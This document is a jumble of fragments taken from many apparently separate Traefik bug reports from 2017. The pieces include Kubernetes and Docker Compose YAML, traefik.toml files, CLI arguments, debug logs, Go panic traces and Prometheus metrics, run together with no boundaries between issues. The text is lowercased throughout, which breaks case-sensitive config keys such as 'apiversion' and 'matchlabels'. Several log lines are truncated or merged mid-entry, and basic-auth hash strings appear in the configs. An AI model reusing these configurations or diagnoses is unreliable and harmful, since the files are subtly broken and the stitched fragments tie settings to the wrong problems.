spec: replicas: 1 selector: matchlabels: k8s-app: traefik-ingress-lb template: metadata: labels: k8s-app: traefik-ingress-lb name: traefik-ingress-lb spec: serviceaccountname: traefik-ingress-controller terminationgraceperiodseconds: 60 containers: - image: traefik name: traefik-ingress-lb resources: limits: cpu: 200m memory: 30mi requests: cpu: 100m memory: 20mi args: - --web - --kubernetes
apiversion: v1
kind: service
metadata: labels: kubernetes.io/cluster-service: 'true' kubernetes.io/name: traefik-ingress-controller name: traefik-ingress-controller namespace: kube-system
spec: type: nodeport ports: - port: 80 nodeport: 30080 name: http selector: k8s-app: traefik-ingress-lb ```
</details> ### if applicable, please paste the log output in debug mode (`--debug` switch)
```arguments
"-c", "/dev/null", "--docker", "--docker.watch", "--docker.swarmmode", "--docker.domain=tld.com", "--web", "--web.address=:9080", "--web.statistics", "--web.metrics", "--web.metrics.prometheus", "--entrypoints=name:http address::80", "--entrypoints=name:https address::443 tls:/certs/cert.pem,/keys/cert.key"
<img width="597" alt="screen shot 2017-07-04 at 15 56 44" src=" ">
note: ssl certificate names have been replace with "somecert" for privacy
the acme email has also been replaced
defaultentrypoints = ["http", "https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.crt" keyfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.key" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.crt" keyfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.key" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.crt" keyfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.key" [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.crt" keyfile = "/etc/ssl/certs/deployed/wildcard.somecert.com.key" [file] watch = true [acme] email = "someemail" storage = "acme.json" storagefile = "acme.json"
# ondemand = true onhostrule = true entrypoint = "https"
# caserver = " " [docker] exposedbydefault = false ```
args from `docker service inspect traefik`:
"--docker",
"--docker.swarmmode",
"--docker.domain=traefik",
"--docker.watch",
``` traefik labels on the docker service:
traefik.docker.network=traefik-net-no-tls
traefik.frontend.passhostheader=true
traefik.frontend.rule=host:somesite.com
traefik.port=80
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
level=warning msg="error forwarding to err: dial tcp 10.0.17.5:80: getsockopt: connection refused" ```
{ "gracetimeout": 10000000000, "debug": true, "checknewversion": true, "accesslogsfile": "", "traefiklogsfile": "", "loglevel": "error", "entrypoints": { "http": { "network": "", "address": ":8081", "tls": null, "redirect": null, "auth": null, "compress": false } }, "cluster": null, "constraints": [], "acme": null, "defaultentrypoints": [ "http" ], "providersthrottleduration": 2000000000, "maxidleconnsperhost": 200, "idletimeout": 180000000000, "insecureskipverify": false, "retry": null, "healthcheck": { "interval": 30000000000 }, "docker": null, "file": null, "web": { "address": ":8082", "certfile": "", "keyfile": "", "readonly": false, "statistics": null, "metrics": null, "path": "", "auth": null }, "marathon": null, "consul": null, "consulcatalog": null, "etcd": null, "zookeeper": null, "boltdb": { "watch": true, "filename": "", "constraints": [], "endpoint": "/users/tochti/tmp/traefik.db", "prefix": "/traefik", "tls": null, "username": "", "password": "" }, "kubernetes": null, "mesos": null, "eureka": null, "ecs": null, "rancher": null, "dynamodb": null, "configfile": "/users/tochti/tmp/traefik_test/config.toml"
</details> ### bolt "traefik" bucket items ```
/traefik/backends/srv1_example_com/servers/server_1/url
/traefik/frontends/srv1_example_com/backend srv1_example_com
/traefik/frontends/srv1_example_com/routes/test_1/rule host:srv1.example.com
debug = true
loglevel = "info"
defaultentrypoints = ["http","https"] [entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [web]
address = ":8080" [web.auth.basic] users = [ "test:$apr1$y8x0t234$8hoajekika4wji13yetbk." ] [kubernetes]
namespaces = [ "default", "kube-system" ]
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-06-27t15:32:58z" level=info msg="traefik version v1.3.1 built on 2017-06-16_11:21:48am" time="2017-06-27t15:32:58z" level=info msg="using toml configuration file /config/traefik.toml" time="2017-06-27t15:32:58z" level=debug msg="global configuration loaded {"gracetimeout":10000000000,"debug":true,"checknewversion":true,"accesslogsfile":"","traefiklogsfile":"","loglevel":"debug","entrypoints":{"http":{"network":"","address":":80","tls":null,"redirect":null,"auth":null,"compress":false},"https":{"network":"","address":":443","tls":null,"redirect":null,"auth":null,"compress":false}},"cluster":null,"constraints":[],"acme":null,"defaultentrypoints":["http","https"],"providersthrottleduration":2000000000,"maxidleconnsperhost":200,"idletimeout":180000000000,"insecureskipverify":false,"retry":null,"healthcheck":{"interval":30000000000},"docker":null,"file":null,"web":{"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":{"basic":{"users":["test:$apr1$y8x0t234$8hoajekika4wji13yetbk."],"usersfile":""},"digest":null,"headerfield":""}},"marathon":null,"consul":null,"consulcatalog":null,"etcd":null,"zookeeper":null,"boltdb":null,"kubernetes":{"watch":true,"filename":"","constraints":[],"endpoint":"","token":"","certauthfilepath":"","disablepasshostheaders":false,"namespaces":["default","kube-system"],"labelselector":""},"mesos":null,"eureka":null,"ecs":null,"rancher":null,"dynamodb":null}" time="2017-06-27t15:32:58z" level=info msg="preparing server https &{network: address::443 tls:<nil> redirect:<nil> auth:<nil> compress:false}" time="2017-06-27t15:32:58z" level=info msg="preparing server http &{network: address::80 tls:<nil> redirect:<nil> auth:<nil> compress:false}" time="2017-06-27t15:32:58z" level=info msg="starting provider *server.webprovider {"address":":8080","certfile":"","keyfile":"","readonly":false,"statistics":null,"metrics":null,"path":"","auth":{"basic":{"users":["test:$apr1$y8x0t234$8hoajekika4wji13yetbk."],"usersfile":""},"digest":null,"headerfield":""}}" time="2017-06-27t15:32:58z" level=info msg="starting provider *kubernetes.provider {"watch":true,"filename":"","constraints":[],"endpoint":"","token":"","certauthfilepath":"","disablepasshostheaders":false,"namespaces":["default","kube-system"],"labelselector":""}" time="2017-06-27t15:32:58z" level=info msg="starting server on :80" time="2017-06-27t15:32:58z" level=info msg="starting server on :443" time="2017-06-27t15:32:58z" level=info msg="creating in-cluster provider client
" time="2017-06-27t15:32:58z" level=debug msg="using label selector: \'\'" time="2017-06-27t15:32:59z" level=debug msg="received event from kubernetes &endpoints{objectmeta:objectmeta{name:tiller-deploy,generatename:,namespace:kube-system,selflink:/api/v1/namespaces/kube-system/endpoints/tiller-deploy,uid:db0c7d32-1b98-11e7-8d60-0025905d1042,resourceversion:9558297,generation:0,creationtimestamp:2017-04-07 13:48:18 +0000 utc,deletiontimestamp:<nil>,deletiongraceperiodseconds:nil,labels:map[string]string{app: helm,name: tiller,},annotations:map[string]string{},ownerreferences:[],finalizers:[],clustername:,},subsets:[{[{192.168.0.4 objectreference{kind:pod,namespace:kube-system,name:tiller-deploy-1332042700-pb18c,uid:daebcdb3-1b98-11e7-8d60-0025905d1042,apiversion:,resourceversion:9558296,fieldpath:,}}] [] [{tiller 44134 tcp}]}],}" time="2017-06-27t15:32:59z" level=error msg="provider connection error secret "kube-system"/"k8s-dashboard-basic-auth" not found, retrying in 651.281427ms" error: logging before flag.parse: e0627 15:32:59.062442 1 runtime.go:66] observed a panic: "send on closed channel" (send on closed channel)
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:72
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:65
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:51
/usr/local/go/src/runtime/asm_amd64.s:514
/usr/local/go/src/runtime/panic.go:489
/usr/local/go/src/runtime/chan.go:180
/usr/local/go/src/runtime/chan.go:604
/go/src/github.com/containous/traefik/provider/kubernetes/client.go:136
/go/src/github.com/containous/traefik/provider/kubernetes/client.go:143
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:173
<autogenerated>:50
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:251
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:420
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:131
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:96
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:97
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:52
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102
/usr/local/go/src/runtime/asm_amd64.s:2197
error: logging before flag.parse: e0627 15:32:59.062615 1 runtime.go:66] observed a panic: "send on closed channel" (send on closed channel)
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:72
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:65
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:51
/usr/local/go/src/runtime/asm_amd64.s:514
/usr/local/go/src/runtime/panic.go:489
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:58
/usr/local/go/src/runtime/asm_amd64.s:514
/usr/local/go/src/runtime/panic.go:489
/usr/local/go/src/runtime/chan.go:180
/usr/local/go/src/runtime/chan.go:604
/go/src/github.com/containous/traefik/provider/kubernetes/client.go:136
/go/src/github.com/containous/traefik/provider/kubernetes/client.go:143
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:173
<autogenerated>:50
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:251
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:420
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:131
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:96
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:97
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:52
/go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102
/usr/local/go/src/runtime/asm_amd64.s:2197
panic: send on closed channel [recovered] panic: send on closed channel [recovered] panic: send on closed channel goroutine 39 [running]:
github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime.handlecrash( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:58 +
panic( , ) /usr/local/go/src/runtime/panic.go:489 +
github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime.handlecrash( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/runtime/runtime.go:58 +
panic( , ) /usr/local/go/src/runtime/panic.go:489 +
github.com/containous/traefik/provider/kubernetes.eventhandlerfunc( , , ) /go/src/github.com/containous/traefik/provider/kubernetes/client.go:136 +
github.com/containous/traefik/provider/kubernetes.newresourceeventhandlerfuncs.func1( , ) /go/src/github.com/containous/traefik/provider/kubernetes/client.go:143 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.resourceeventhandlerfuncs.onadd( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:173 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*resourceeventhandlerfuncs).onadd( , , ) <autogenerated>:50 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.newinformer.func1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:251 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*deltafifo).pop( , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:420 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).processloop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:131 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.processloop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102 +
github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:96 +
github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:97 +
github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/pkg/util/wait/wait.go:52 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102 +
created by github.com/containous/traefik/provider/kubernetes.(*clientimpl).watchsecrets /go/src/github.com/containous/traefik/provider/kubernetes/client.go:227 +
see docker compose file above
see all my configs, toml, other container at:
thank you!
# traefik.toml
loglevel = "debug"
defaultentrypoints = ["http"] [entrypoints] [entrypoints.http] address = ":8080" [file] # rules
[backends] [backends.backend1] [backends.backend1.servers.server1] url = " " [backends.backend1.servers.server2] url = " " [backends.backend1.servers.server3] url = " " [frontends] [frontends.frontend1] backend = "backend1" [frontends.frontend1.routes.test_1] rule = "path:/ok" [retry]
attempts = 3 [web]
address = ":8000" [web.metrics.prometheus] buckets=[0.1,0.3,1.2,5.0]
``` ### problem description at the moment the traefik metrics middleware is included twice in the middleware chain
one time the metrics are included in the `starthttpservers` [here]( #l195) and a second time when loading the config [here]( #l786)
this leads to the following generated metrics when requesting the `/metrics` endpoint
# help traefik_backend_retries_total how many request retries happened in total.
# type traefik_backend_retries_total counter
traefik_backend_retries_total{service="backend1"} 14 # help traefik_request_duration_seconds how long it took to process the request.
# type traefik_request_duration_seconds histogram
traefik_request_duration_seconds_bucket{service="backend1",le="0.1"} 7
traefik_request_duration_seconds_bucket{service="backend1",le="0.3"} 7
traefik_request_duration_seconds_bucket{service="backend1",le="1.2"} 7
traefik_request_duration_seconds_bucket{service="backend1",le="5"} 7
traefik_request_duration_seconds_bucket{service="backend1",le="+inf"} 7
traefik_request_duration_seconds_sum{service="backend1"} 0.036858719
traefik_request_duration_seconds_count{service="backend1"} 7
traefik_request_duration_seconds_bucket{service="http",le="0.1"} 7
traefik_request_duration_seconds_bucket{service="http",le="0.3"} 7
traefik_request_duration_seconds_bucket{service="http",le="1.2"} 7
traefik_request_duration_seconds_bucket{service="http",le="5"} 7
traefik_request_duration_seconds_bucket{service="http",le="+inf"} 7
traefik_request_duration_seconds_sum{service="http"} 0.037084179
traefik_request_duration_seconds_count{service="http"} 7 # help traefik_requests_total how many http requests processed, partitioned by status code and method.
# type traefik_requests_total counter
traefik_requests_total{code="200",method="get",service="backend1"} 7
traefik_requests_total{code="200",method="get",service="http"} 7
``` this is problematic, because effectively this means that when you aggregate the metrics in your prometheus queries, without considering the labels, you will end up with twice as many requests as actually happen
therefore the proper fix should be to remove the integration when starting the http servers
as one point to consider, this would mean that redirects are actually not tracked anymore
when tracking of the redirects is desired, i guess we should create a new metrics, to handle this cleanly
can you confirm that this is a bug for you and maybe give a recommendation on how to go for the fix?
i run traefik inside docker(alpine) against a dc/os 1.9 cluster without any authentication
apart from marathon provider i use ```file``` provider (it works)
endpoint = " "
watch = true
domain = "ikcloud.xx.es"
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```shell
time="2017-06-13t14:38:39z" level=error msg="failed to create a client for marathon, error: invalid response from marathon"
time="2017-06-13t14:38:39z" level=debug msg="configuration received from provider marathon: null"
``` any hints on this?
services: plone: labels: traefik.port: 8080 traefik.enable: true traefik.frontend.rule: "host:www.domain; addprefix: /virtualhostbase/https/www.domain/portal/virtualhostroot" traefik.acme.domains: www.domain ```
traefik: ports: - 8000:8080/tcp - 80:80/tcp - 443:443/tcp image: traefik:1.3.0-alpine command: - "--web" - "--entrypoints=name:http\\ address::80\\ redirect.entrypoint:https" - "--entrypoints=name:https\\ address::443\\ tls" - "--defaultentrypoints=http,https" - "--rancher" - "--rancher.domain=${rancher_domain}" - "--rancher.endpoint=${rancher_endpoint}" - "--rancher.accesskey=${rancher_accesskey}" - "--rancher.secretkey=${rancher_secretkey}" - "--rancher.exposedbydefault=false" - "--acme" - "--acme.email=${acme_email}" - "--acme.storage=/mnt/acme.json" - "--acme.entrypoint=https" - "--acme.ondemand=true" - "--loglevel=info"
``` what the backend sees:
get /virtualhostbase/https/www.domain/portal/virtualhostroot/virtualhostbase/https/www.domain/portal/virtualhostroot/ http/1.1" 404 29675 ```
- [rhel atomic host v7.3.4](
- docker-latest v1.13.1-4
- [traefik v1.3.0 gnu/linux amd64](
- below are the labels added when i created the docker services of the backend servers: ```
traefik.backend
traefik.backend.circuitbreaker.expression
traefik.backend.loadbalancer.sticky
traefik.backend.loadbalancer.swarm
traefik.docker.network
traefik.frontend.passhostheader
traefik.frontend.rule
traefik.port
- below are the contents of my traefik.toml: ```toml
checknewversion = false
traefiklogsfile = "/var/log/traefik/traefik.log"
accesslogsfile = "/var/log/traefik/access.log"
loglevel = "info"
defaultentrypoints = ["http","https"]
insecureskipverify = true [web] address = ":8080"
# certfile = "/etc/ssl/traefik.crt" # commented for prometheus to work
# keyfile = "/etc/ssl/traefik.key" # commented for prometheus to work [web.auth.basic] users = ["username:$apr1$bjvip@$5w0rdtxwqidelobtckdnu0h1"] [web.statistics] recenterrors = 10 [web.metrics] [web.metrics.prometheus] buckets=[0.1,0.3,1.2,5.0] [entrypoints] [entrypoints.http] address = ":52100" [entrypoints.https] address = ":52000" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/traefik.crt" keyfile = "/etc/ssl/traefik.key" [retry] attempts = 3 [docker] endpoint = "tcp://master1.example.com:2376" # spof; ideally multiple master nodes watch = true domain = "example.com" swarmmode = true usebindportip = true [docker.tls] ca = "/etc/ssl/master1/master1-ca.pem" cert = "/etc/ssl/master1/master1-client-cert.pem" key = "/etc/ssl/master1/master1-client-key.pem"
### if applicable, please paste the log output in debug mode (--debug switch) ```shell
10.255.0.4 - - [08/jun/2017:13:03:10.255.0.4 - - [08/jun/2017:13:04:26 +0800] "post /sprockets/api/v1/product/txn/docs/validate http/1.1" 200 10665 "" "apache-httpclient/4.3.6 (java 1.5)" 285 "pathprefix-sprockets-api-v1-product" " " 5829ms
10.255.0.4 - - [08/jun/2017:14:41:40 +0800] "get /sprockets/api/v1/project/console/styles/api-console-light-theme.css http/1.1" 200 117165 " " "mozilla/4.0 (compatible; msie 7.0; windows nt 6.1; wow64; trident/4.0; slcc2; .net clr 2.0.50727; .net clr 3.5.30729; .net clr 3.0.30729; .net4.0c; .net4.0e)" 427 "pathprefix-sprockets-api-v1-c10.255.0.4 - - [08/jun/2017:14:49:52 +0800] "post /sprockets/api/v1/product/txn/docs/retrieve http/1.1" 200 6842 "" "apache-httpclient/4.3.6 (java 1.5)" 304 "pathprefix-sprockets-api-v1-product" " " 49ms
10.255.0.4 - - [08/jun/2017:14:54:54 +0800] "get /sprockets/api/v1/product/txn/docs/info http/1.1" 404 35 "" "mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/55.0.2883.75 safari/537.36" 244 "pathprefix-sprockets-api-v1-product" " - - [08/jun/2017:14:58:36 +0800] "get / http/2.0" 200 1474 "" "mozilla/5.0 (windows nt 6.1; wow64) applewebkit/537.36 (khtml, like gecko) chrome/55.0.2883.75 safari/537.36" 306 "pathprefix" " " 3ms
traefik: image: traefik:1.3.0-alpine volumes: - traefik_acme:/mnt ports: - 8000:8080/tcp - 80:80/tcp - 443:443/tcp command: - --web - --entrypoints=name:http address::80 redirect.entrypoint:https - --entrypoints=name:https address::443 tls - --defaultentrypoints=http,https - --rancher - --rancher.domain=rancher.domain - --rancher.endpoint= - --rancher.accesskey=key - --rancher.secretkey=secretkey - --rancher.exposedbydefault=false - --acme - --acme.email=email@mail.com - --acme.storage=/mnt/acme.json - --acme.entrypoint=https - --acme.ondemand=true - --loglevel=info ```
debug = true
checknewversion = false
loglevel = "warn"
insecureskipverify = true
defaultentrypoints = ["http", "https"]
address = ":8080"
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443"
[entrypoints.https.tls]
email = "konstantin@somehost.io"
storage = "traefik/acme/account"
storagefile = "acme.json"
entrypoint = "https"
acmelogging = true
ondemand = true
[[acme.domains]]
main = "somehost1.io"
[[acme.domains]]
main = "elib.somehost.ru"
[[acme.domains]]
main = "somehost.io"
sans = ["www.somehost.io"]
[backends.backend1]
[backends.backend1.servers.server1]
url = " "
[backends.backend2]
[backends.backend2.servers.server1]
url = " "
[backends.backend3]
[backends.backend3.servers.server1]
url = " "
[frontends]
[frontends.frontend1]
backend = "backend1"
passhostheader = true
[frontends.frontend1.routes.test_1]
rule = "pathprefix: /"
[frontends.frontend2]
backend = "backend2"
passhostheader = true
[frontends.frontend2.routes.test_1]
rule = "host: somehost.io, www.somehost.io"
[frontends.frontend3]
backend = "backend3"
passhostheader = true
[frontends.frontend3.routes.test_1]
rule = "host:elib.somehost.ru"
prefix = "traefik"
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/etc/ssl/traefik/example.domain.com.crt" keyfile = "/etc/ssl/traefik/example.domain.com.key" [acme]
email = "some.fake@email.com"
storage = "/etc/traefik/acme/acme.json"
entrypoint = "https"
acmelogging = true
ondemand = false
onhostrule = false [[acme.domains]]
main = "subdomain.multi.example.domain.com"
#traefik.toml
defaultentrypoints = ["http","https"]
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [[entrypoints.https.tls.certificates]] certfile = "/ssl/chain.crt" keyfile = "/ssl/chain.key" [kubernetes]
namespaces = ["default","dev","kube-system"]
running on kubernetes 1.6.2
--> ### if applicable, please paste the log output in debug mode (`--debug` switch) ``` ```
relevant traefik.toml
endpoint = "unix:///var/run/docker.sock"
domain = "example.com"
watch = true
exposedbydefault = false
swarmmode = true
``` relevant docker-compose
```yaml proxy: image: custom-repo/traefik deploy: mode: global restart_policy: condition: any environment: - /var/run/docker.sock:/var/run/docker.sock ports: - "80:80" - "443:443" networks: - proxy portainer: image: portainer/portainer deploy: mode: global restart_policy: condition: any placement: constraints: - node.role == manager labels: - "traefik.enable=true" - "traefik.backend=microbot" - "traefik.frontend.rule=host:portainer.example.com" - "traefik.frontend.entrypoints=https" - "traefik.docker.network=infrastructure_proxy" expose: - "9000" networks: - proxy volumes: - /var/run/docker.sock:/var/run/docker.sock - portainer:/data
``` ### if applicable, please paste the log output in debug mode (`--debug` switch) ```
time="2017-05-04t02:53:37z" level=error msg="failed to list services for docker swarm mode, error cannot connect to the docker daemon
is the docker daemon running on this host?" time="2017-05-04t02:53:37z" level=error msg="docker connection error cannot connect to the docker daemon
is the docker daemon running on this host?, retrying in 917.800683ms" time="2017-05-04t02:53:38z" level=error msg="failed to list services for docker swarm mode, error cannot connect to the docker daemon
is the docker daemon running on this host?" time="2017-05-04t02:53:38z" level=error msg="docker connection error cannot connect to the docker daemon
is the docker daemon running on this host?, retrying in 2.726923256s" time="2017-05-04t02:53:41z" level=error msg="failed to list services for docker swarm mode, error cannot connect to the docker daemon
is the docker daemon running on this host?" time="2017-05-04t02:53:41z" level=error msg="docker connection error cannot connect to the docker daemon
is the docker daemon running on this host?, retrying in 3.720770743s" time="2017-05-04t02:53:45z" level=error msg="failed to list services for docker swarm mode, error cannot connect to the docker daemon
is the docker daemon running on this host?" time="2017-05-04t02:53:45z" level=error msg="docker connection error cannot connect to the docker daemon
is the docker daemon running on this host?, retrying in 6.081475629s" time="2017-05-04t02:53:51z" level=error msg="failed to list services for docker swarm mode, error cannot connect to the docker daemon
is the docker daemon running on this host?" time="2017-05-04t02:53:51z" level=error msg="docker connection error cannot connect to the docker daemon
is the docker daemon running on this host?, retrying in 8.128386818s" time="2017-05-04t02:53:59z" level=error msg="failed to list services for docker swarm mode, error cannot connect to the docker daemon
is the docker daemon running on this host?" time="2017-05-04t02:53:59z" level=error msg="docker connection error cannot connect to the docker daemon
is the docker daemon running on this host?, retrying in 18.514221469s" ```
i use traefik as an inverse proxy in a docker (not swarm) node
traefik is booted with this command from a docker-compose file, publishing ports 80 and 443: ```
command: - --acme.acmelogging - --acme.email=someemail@example.com - --acme.entrypoint=https - --acme.onhostrule - --acme.storage=/etc/traefik/acme/acme.json - --defaultentrypoints=http,https - --entrypoints=name:http address::80 redirect.entrypoint:https - --entrypoints=name:https address::443 tls - --loglevel=debug - --docker - --docker.exposedbydefault=false - --docker.watch
``` i guess that's the important part of it
### if applicable, please paste the log output in debug mode (`--debug` switch) ```
debu[2017-05-02t11:47:20z] docker event received {status:health_status: healthy id:a9749199f37a505b32fc776fdf65c96f50cecc7ce0e5d9011edc3b3c35c3436b from:gitlab/gitlab-ce type:container action:health_status: healthy actor:{id:a9749199f37a505b32fc776fdf65c96f50cecc7ce0e5d9011edc3b3c35c3436b attributes:map[com.docker.compose.oneoff:false com.docker.compose.project:examplegitlab image:gitlab/gitlab-ce name:examplegitlab_gitlab_1 traefik.frontend.passhostheader:true traefik.enable:true traefik.frontend.rule:host:gitlab.example.com traefik.port:80 com.docker.compose.config-hash:7a12b6f5b7350181b8721fdd25d3f81f5fab38e8f959e3b3667e894d013e99fa com.docker.compose.container-number:1 com.docker.compose.service:gitlab com.docker.compose.version:1.12.0 traefik.docker.network:inverseproxy_shared]} time:1493725640 timenano:1493725640730950152} debu[2017-05-02t11:47:20z] filtering container without port and no traefik.port label /examplegitlab_backup_1 debu[2017-05-02t11:47:20z] filtering disabled container /examplegitlab_smtp_1 debu[2017-05-02t11:47:20z] filtering disabled container /inverseproxy_proxy_1 debu[2017-05-02t11:47:20z] filtering disabled container /inverseproxy_dockersocket_1 warn[2017-05-02t11:47:20z] could not find network named 'inverseproxy_shared' for container '/examplegitlab_gitlab_1'! maybe you're missing the project's prefix in the label? defaulting to first available network
debu[2017-05-02t11:47:20z] load balancer method '<nil>' for backend backend-examplegitlab-gitlab-1: invalid method, using default
using default wrr
debu[2017-05-02t11:47:20z] configuration received from provider docker: {"backends":{"backend-examplegitlab-gitlab-1":{"servers":{"server-examplegitlab_gitlab_1":{"url":" ","weight":0}},"loadbalancer":{"method":"wrr"}}},"frontends":{"frontend-host-gitlab-example-com":{"entrypoints":["http","https"],"backend":"backend-examplegitlab-gitlab-1","routes":{"route-frontend-host-gitlab-example-com":{"rule":"host:gitlab.example.com"}},"passhostheader":true,"priority":0}}} debu[2017-05-02t11:47:20z] last docker config received more than 2s, ok debu[2017-05-02t11:47:20z] creating frontend frontend-host-gitlab-example-com debu[2017-05-02t11:47:20z] wiring frontend frontend-host-gitlab-example-com to entrypoint http debu[2017-05-02t11:47:20z] creating route route-frontend-host-gitlab-example-com host:gitlab.example.com debu[2017-05-02t11:47:20z] creating entrypoint redirect http -> https : ^(?:https?:\\/\\/)?([\\w\\._-]+)(?::\\d+)?(.*)$ -> debu[2017-05-02t11:47:20z] creating backend backend-examplegitlab-gitlab-1 debu[2017-05-02t11:47:20z] creating load-balancer wrr debu[2017-05-02t11:47:20z] creating server server-examplegitlab_gitlab_1 at with weight 0 debu[2017-05-02t11:47:20z] wiring frontend frontend-host-gitlab-example-com to entrypoint https debu[2017-05-02t11:47:20z] creating route route-frontend-host-gitlab-example-com host:gitlab.example.com debu[2017-05-02t11:47:20z] creating backend backend-examplegitlab-gitlab-1 debu[2017-05-02t11:47:20z] creating load-balancer wrr debu[2017-05-02t11:47:20z] creating server server-examplegitlab_gitlab_1 at with weight 0 info[2017-05-02t11:47:20z] server configuration reloaded on :80 info[2017-05-02t11:47:20z] server configuration reloaded on :443 debu[2017-05-02t11:47:20z] loadcertificatefordomains [gitlab.example.com]..
debu[2017-05-02t11:47:20z] loading acme certificates [gitlab.example.com]..
legolog: 2017/05/02 11:47:20 [info][gitlab.example.com] acme: obtaining bundled san certificate
erro[2017-05-02t11:47:21z] map[gitlab.example.com:acme: error 400 - urn:acme:error:badnonce - jws has invalid anti-replay nonce 41n3094n1c04yrn01923ryn091237rync109237yrnc] erro[2017-05-02t11:47:21z] error getting acme certificates [gitlab.example.com] : cannot obtain certificates map[gitlab.example.com:acme: error 400 - urn:acme:error:badnonce - jws has invalid anti-replay nonce 41n3094n1c04yrn01923ryn091237rync109237yrnc]+v ```
```yaml image: traefik:1.2-alpine command: --web --docker --docker.swarmmode --docker.domain=docker.localhost --docker.watch --debug --loglevel=debug \\ --entrypoints='name:https address::443 tls' \\ --entrypoints='name:http address::80 ${proxy_redirect}' \\ --acme=${acme} \\ --acme.entrypoint=https \\ --acme.email=myname@mydomain.com \\ --acme.storage=/etc/traefik/acme/acme.json \\ --acme.domains=tc.mydomain.com \\ --acme.ondemand=${acme} \\ --acme.onhostrule=${acme}
where `proxy_redirect=""` and `acme=false`
i do this to be able to `docker deploy` to my local docker for mac
i do not want acme support in this case, and run from port 80
